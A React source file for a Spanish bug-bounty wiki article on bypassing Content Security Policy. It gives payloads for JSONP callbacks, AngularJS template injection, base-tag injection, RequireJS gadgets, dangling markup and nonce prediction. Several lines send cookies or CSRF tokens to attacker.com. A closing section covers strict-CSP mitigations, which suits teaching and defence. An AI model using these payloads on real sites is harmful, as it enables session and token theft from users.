/**
 * CSP BYPASS
 * Bypassear Content Security Policy
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Shield, Lock, Unlock, Zap, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function CSPBypassContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="Content Security Policy - La Última Línea de Defensa">
        <Paragraph>
          <Strong>Content Security Policy (CSP)</Strong> es un header HTTP que previene XSS 
          restringiendo qué scripts pueden ejecutarse. Pero configuraciones débiles permiten bypass 
          via <Strong>JSONP endpoints</Strong>, <Strong>AngularJS CDN</Strong>, y <Strong>base-uri</Strong>.
        </Paragraph>

        <AlertDanger title="Técnicas de Bypass">
          <ul className="mt-2 space-y-1">
            <ListItem>📜 JSONP endpoint en whitelist</ListItem>
            <ListItem>⚡ AngularJS/jQuery en trusted CDN</ListItem>
            <ListItem>🔗 base-uri no restringido</ListItem>
            <ListItem>🎯 script-src 'unsafe-inline' con nonce predecible</ListItem>
            <ListItem>📦 Webpack/Require.js bypass</ListItem>
            <ListItem>🚪 Dangling markup injection</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="fundamentos" title="1. CSP Básico - Entender las Directivas">
        <CodeBlock
          language="text"
          title="Ejemplo de CSP header"
          code={`Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://cdn.trusted.com; 
  object-src 'none';
  base-uri 'self';`}
        />

        <Subsection title="Directivas Importantes">
          <HighlightBox color="blue">
            <Strong>script-src:</Strong> Controla de dónde se pueden cargar scripts<br />
            <Strong>default-src:</Strong> Fallback para otras directivas<br />
            <Strong>object-src:</Strong> Controla {'<object>'}, {'<embed>'}, {'<applet>'}<br />
            <Strong>base-uri:</Strong> Restringe {'<base>'} tag (importante!)<br />
            <Strong>unsafe-inline:</Strong> Permite inline scripts (INSEGURO)<br />
            <Strong>unsafe-eval:</Strong> Permite eval() (INSEGURO)
          </HighlightBox>
        </Subsection>
      </Section>

      <Section id="jsonp-bypass" title="2. JSONP Callback Bypass">
        <Paragraph>
          Si CSP whitelist incluye un dominio con endpoint JSONP, un atacante puede 
          ejecutar JavaScript arbitrario.
        </Paragraph>

        <CodeBlock
          language="text"
          title="CSP vulnerable - Google APIs whitelisted"
          code={`Content-Security-Policy: 
  script-src 'self' https://www.google.com https://accounts.google.com;`}
        />

        <CodeBlock
          language="html"
          title="Payload - Abusar de Google JSONP endpoint"
          code={`<!-- Google Translate API tiene JSONP endpoint -->
<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert"></script>

<!-- Resultado: alert() se ejecuta con response data -->

<!-- Alternativa con payload custom -->
<script>
  function evilCallback(data) {
    // Ejecutar payload
    eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='));  // alert(document.cookie)
  }
</script>
<script src="https://accounts.google.com/o/oauth2/revoke?callback=evilCallback"></script>`}
        />

        <Subsection title="Otros JSONP Endpoints Comunes">
          <CodeBlock
            language="text"
            title="CDNs y APIs con JSONP"
            code={`# Google APIs
https://www.google.com/complete/search?callback=CALLBACK

# YouTube
https://www.youtube.com/oembed?callback=CALLBACK

# Vimeo
https://vimeo.com/api/oembed.json?callback=CALLBACK

# Flickr
https://api.flickr.com/services/rest/?callback=CALLBACK

# Tumblr
https://api.tumblr.com/v2/blog/staff.tumblr.com/info?callback=CALLBACK

# GitHub (legacy)
https://api.github.com/users/octocat?callback=CALLBACK`}
          />
        </Subsection>
      </Section>

      <Section id="angularjs-bypass" title="3. AngularJS CDN Bypass">
        <CodeBlock
          language="text"
          title="CSP con AngularJS CDN whitelisted"
          code={`Content-Security-Policy: 
  script-src 'self' https://ajax.googleapis.com;`}
        />

        <CodeBlock
          language="html"
          title="Payload - AngularJS template injection"
          code={`<!-- Cargar AngularJS desde CDN permitido -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>

<!-- AngularJS app mínima -->
<div ng-app ng-csp>
  <!-- Template injection payload -->
  {{constructor.constructor('alert(document.cookie)')()}}
</div>

<!-- AngularJS parsea y ejecuta el payload -->
<!-- Resultado: alert() ejecutado, CSP bypassed -->`}
        />

        <AlertWarning>
          AngularJS 1.x permite <Strong>template injection</Strong> sin necesidad de 'unsafe-eval'. 
          Si AngularJS CDN está whitelisted, CSP es bypasseable.
        </AlertWarning>
      </Section>

      <Section id="base-uri-bypass" title="4. base-uri Bypass - Inyección de Base Tag">
        <Paragraph>
          Si <InlineCode>base-uri</InlineCode> no está restringido, un atacante puede inyectar 
          un tag <InlineCode>{'<base>'}</InlineCode> para redirigir scripts relativos a su servidor.
        </Paragraph>

        <CodeBlock
          language="text"
          title="CSP sin base-uri restriction"
          code={`Content-Security-Policy: 
  script-src 'self';
  # ⚠️ Falta base-uri!`}
        />

        <CodeBlock
          language="html"
          title="Página vulnerable con script relativo"
          code={`<!DOCTYPE html>
<html>
<head>
  <title>Vulnerable Page</title>
</head>
<body>
  <h1>Dashboard</h1>
  
  <!-- Script carga de ruta relativa -->
  <script src="/static/app.js"></script>
</body>
</html>`}
        />

        <CodeBlock
          language="html"
          title="Payload - Inyectar <base> tag"
          code={`<!-- Atacante inyecta vía XSS reflejado/stored -->
<base href="https://attacker.com/">

<!-- Ahora el script carga de:
https://attacker.com/static/app.js
en lugar de:
https://victim.com/static/app.js
-->

<!-- CSP permite 'self', pero 'self' ahora resuelve a attacker.com! -->`}
        />

        <TerminalOutput title="Servidor del atacante">
          {`# attacker.com/static/app.js
alert('CSP bypassed via base-uri!');
fetch('https://attacker.com/steal?cookie=' + document.cookie);

# Resultado: Script malicioso ejecutado`}
        </TerminalOutput>
      </Section>

      <Section id="nonce-prediction" title="5. Nonce Prediction">
        <Paragraph>
          CSP con <InlineCode>script-src 'nonce-{'{random}'}'</InlineCode> solo permite scripts 
          con nonce correcto. Pero si el nonce es predecible, puede bypassearse.
        </Paragraph>

        <CodeBlock
          language="text"
          title="CSP con nonce"
          code={`Content-Security-Policy: 
  script-src 'nonce-r4nd0m123';`}
        />

        <CodeBlock
          language="html"
          title="Script permitido con nonce"
          code={`<!DOCTYPE html>
<html>
<body>
  <!-- ✅ Permitido - Nonce correcto -->
  <script nonce="r4nd0m123">
    console.log('Legitimate script');
  </script>
  
  <!-- ❌ Bloqueado - Sin nonce -->
  <script>
    alert('Blocked by CSP');
  </script>
</body>
</html>`}
        />

        <CodeBlock
          language="python"
          title="Ataque - Predecir nonce si es débil"
          code={`import requests
import re

# Si nonce es timestamp-based o secuencial, puede predecirse
def predict_nonce():
    # 1. Hacer request para obtener nonce actual
    response = requests.get('https://victim.com/page')
    
    # Extraer nonce del HTML
    match = re.search(r"nonce-([a-zA-Z0-9]+)", response.text)
    current_nonce = match.group(1)
    
    # 2. Analizar patrón
    # Ejemplo: nonce es base64(timestamp)
    import base64
    decoded = base64.b64decode(current_nonce)
    print(f"Decoded nonce: {decoded}")
    
    # 3. Predecir próximo nonce
    import time
    next_timestamp = int(time.time()) + 1
    predicted_nonce = base64.b64encode(str(next_timestamp).encode()).decode()
    
    return predicted_nonce

# 4. Inyectar script con nonce predicho
predicted = predict_nonce()
payload = f'<script nonce="{predicted}">alert(1)</script>'

print(f"Payload: {payload}")`}
        />
      </Section>

      <Section id="script-gadgets" title="6. Script Gadgets - Abusar de Librerías">
        <Paragraph>
          Librerías JavaScript legítimas pueden tener <Strong>gadgets</Strong> que permiten 
          ejecución arbitraria sin violar CSP.
        </Paragraph>

        <Subsection title="jQuery $.globalEval()">
          <CodeBlock
            language="html"
            title="Payload - Abusar de jQuery"
            code={`<!-- CSP permite jQuery CDN -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<!-- Inyectar payload via data-* attribute -->
<div id="trigger" data-code="alert(document.cookie)"></div>

<script nonce="VALID_NONCE">
  // Script legítimo con nonce
  $(document).ready(function() {
    // ❌ VULNERABLE - globalEval ejecuta código arbitrario
    const code = $('#trigger').data('code');
    $.globalEval(code);
  });
</script>

<!-- Resultado: alert() ejecutado sin violar CSP -->`}
          />
        </Subsection>

        <Subsection title="RequireJS Gadget">
          <CodeBlock
            language="html"
            title="Payload - RequireJS define()"
            code={`<!-- CSP permite RequireJS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js"></script>

<!-- Payload -->
<script nonce="VALID_NONCE">
  // define() permite cargar módulos arbitrarios
  define(['https://attacker.com/evil.js'], function(evil) {
    evil.run();
  });
</script>

<!-- attacker.com/evil.js:
define(function() {
  return {
    run: function() {
      alert(document.cookie);
    }
  };
});
-->`}
          />
        </Subsection>
      </Section>

      <Section id="dangling-markup" title="7. Dangling Markup Injection">
        <Paragraph>
          Si CSP permite ciertos tags, <Strong>dangling markup</Strong> puede exfiltrar 
          datos sin ejecutar JavaScript.
        </Paragraph>

        <CodeBlock
          language="html"
          title="Payload - Exfiltrar CSRF token sin JS"
          code={`<!-- Inyectar en página con CSRF token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf" value="SECRET_TOKEN_HERE">
  <input type="text" name="amount">
</form>

<!-- Payload inyectado ANTES del form -->
<img src='https://attacker.com/steal?data=

<!-- El browser trata todo hasta próximo ' como parte del src:
<img src='https://attacker.com/steal?data=
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf" value="SECRET_TOKEN_HERE">
  <input type="text" name="amount">
</form>
...
<button>Submit</button>' />  ← Aquí cierra

Resultado: Request GET a attacker.com con CSRF token en query param
-->`}
        />

        <AlertInfo>
          Dangling markup NO ejecuta JavaScript, por eso bypasea CSP. Pero muchos browsers 
          modernos lo bloquean con otras protecciones.
        </AlertInfo>
      </Section>

      <Section id="herramientas" title="8. Herramientas de Análisis">
        <Subsection title="CSP Evaluator (Google)">
          <CodeBlock
            language="bash"
            title="Analizar CSP con Google CSP Evaluator"
            code={`# Online tool:
https://csp-evaluator.withgoogle.com/

# Input: Copiar CSP header
# Output: 
# - Severidad de problemas
# - JSONP endpoints en whitelist
# - Directivas faltantes
# - Bypass potenciales`}
          />
        </Subsection>

        <Subsection title="CSPscanner">
          <CodeBlock
            language="bash"
            title="Escanear CSP automáticamente"
            code={`# Instalar
npm install -g cspscanner

# Escanear site
cspscanner https://victim.com

# Output:
[!] JSONP endpoint found: https://www.google.com/complete/search
[!] AngularJS in whitelist: https://ajax.googleapis.com
[!] base-uri not set
[!] unsafe-inline in script-src

Bypass methods:
1. JSONP callback injection
2. AngularJS template injection
3. Base tag injection`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación - CSP Estricto">
        <AlertDanger title="✅ CSP Seguro">
          Seguir todas estas recomendaciones.
        </AlertDanger>

        <Subsection title="1. Usar Nonces Aleatorios">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Generar nonce random por request"
            code={`const crypto = require('crypto');

app.use((req, res, next) => {
  // ✅ Generar nonce cryptographically secure
  const nonce = crypto.randomBytes(16).toString('base64');
  
  // Guardar en res.locals para usar en templates
  res.locals.cspNonce = nonce;
  
  // ✅ CSP header con nonce
  res.setHeader(
    'Content-Security-Policy',
    \`script-src 'nonce-\${nonce}'; object-src 'none'; base-uri 'none';\`
  );
  
  next();
});

// En template:
// <script nonce="<%= cspNonce %>">...</script>`}
          />
        </Subsection>

        <Subsection title="2. Restringir base-uri">
          <CodeBlock
            language="text"
            title="✅ SEGURO - Prevenir base tag injection"
            code={`Content-Security-Policy: 
  script-src 'nonce-{random}'; 
  object-src 'none';
  base-uri 'none';        ← ¡CRÍTICO!
  frame-ancestors 'none';`}
          />
        </Subsection>

        <Subsection title="3. Evitar Whitelists de CDNs">
          <CodeBlock
            language="text"
            title="❌ INSEGURO - Whitelist amplia"
            code={`Content-Security-Policy: 
  script-src 'self' https://ajax.googleapis.com https://cdnjs.cloudflare.com;
  
# Problemas:
# - AngularJS en googleapis.com → Template injection
# - Múltiples libraries en cdnjs.com → Script gadgets`}
          />

          <CodeBlock
            language="text"
            title="✅ SEGURO - Nonce + strict-dynamic"
            code={`Content-Security-Policy: 
  script-src 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';

# strict-dynamic permite scripts cargados por scripts con nonce
# Sin necesidad de whitelist de dominios`}
          />
        </Subsection>

        <Subsection title="4. CSP Reportes">
          <CodeBlock
            language="text"
            title="✅ Monitorear violaciones de CSP"
            code={`Content-Security-Policy: 
  script-src 'nonce-{random}'; 
  report-uri /csp-violation-report;

# Server endpoint para recibir reportes:
POST /csp-violation-report
{
  "csp-report": {
    "document-uri": "https://victim.com/page",
    "violated-directive": "script-src",
    "blocked-uri": "https://evil.com/script.js",
    "source-file": "https://victim.com/page",
    "line-number": 42
  }
}`}
          />

          <CodeBlock
            language="javascript"
            title="Procesar reportes de CSP"
            code={`app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'];
  
  // Log para análisis
  console.error('CSP Violation:', {
    page: report['document-uri'],
    directive: report['violated-directive'],
    blocked: report['blocked-uri']
  });
  
  // Alertar si es ataque
  if (report['blocked-uri'].includes('attacker.com')) {
    sendSecurityAlert(\`Potential XSS attack on \${report['document-uri']}\`);
  }
  
  res.status(204).end();
});`}
          />
        </Subsection>

        <Subsection title="5. CSP Completo Recomendado">
          <CodeBlock
            language="text"
            title="✅ CSP production-ready"
            code={`Content-Security-Policy: 
  default-src 'none'; 
  script-src 'nonce-{random}' 'strict-dynamic'; 
  style-src 'nonce-{random}'; 
  img-src 'self' data: https:; 
  font-src 'self'; 
  connect-src 'self'; 
  frame-src 'none'; 
  object-src 'none'; 
  base-uri 'none'; 
  form-action 'self'; 
  frame-ancestors 'none'; 
  upgrade-insecure-requests; 
  block-all-mixed-content;
  report-uri /csp-report;

# Explicación:
# - default-src 'none': Todo bloqueado por defecto
# - script-src con nonce + strict-dynamic: Solo scripts confiados
# - base-uri 'none': Prevenir base tag injection
# - frame-ancestors 'none': Prevenir clickjacking
# - upgrade-insecure-requests: Forzar HTTPS
# - report-uri: Monitorear violaciones`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: XXE (XML External Entity)</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/xxe`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Exfiltrar datos via XML parsing</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
